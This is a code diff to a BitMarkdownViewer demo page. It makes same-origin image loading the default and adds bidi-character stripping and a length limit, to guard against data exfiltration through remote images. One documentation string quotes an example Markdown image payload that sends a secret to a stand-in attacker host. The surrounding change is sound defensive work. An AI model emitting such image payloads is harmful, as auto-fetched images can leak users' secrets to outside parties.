@@ -28,10 +28,11 @@ public partial class BitMarkdownViewerDemo
         {
            Name = "ImageRendering",
            Type = "BitMarkdownViewerImageRendering",
-           DefaultValue = "BitMarkdownViewerImageRendering.All",
+           DefaultValue = "BitMarkdownViewerImageRendering.SameOrigin",
            Description = @"Controls whether remote images are allowed to load, guarding against silent data-exfiltration
                            via auto-fetched image URLs (for example ![x](https://attacker.com/leak?data=SECRET)).
-                           Set it to SameOrigin or None when rendering untrusted or AI-generated Markdown.",
+                           Defaults to the safe SameOrigin policy; set it to All to load every remote image when the
+                           source is fully trusted, or None for the strictest policy.",
            LinkType = LinkType.Link,
            Href = "#markdown-viewer-image-rendering-enum",
         },
@@ -410,7 +411,11 @@ Supports ~~strikethrough~~ and bare links like https://bitplatform.dev
     <div class=""mdv-split"">
         <textarea class=""mdv-editor"" spellcheck=""false"" aria-label=""Markdown editor"" @bind=""playgroundMarkdown"" @bind:event=""oninput""></textarea>
         <div class=""mdv-preview"">
-            <BitMarkdownViewer Markdown=""@playgroundMarkdown"" Pipeline=""@playgroundPipeline"" />
+            <BitMarkdownViewer Markdown=""@playgroundMarkdown""
+                               Pipeline=""@playgroundPipeline""
+                               ImageRendering=""BitMarkdownViewerImageRendering.SameOrigin""
+                               StripBidiControlCharacters=""true""
+                               MaxLength=""100000"" />
         </div>
     </div>
 </div>";
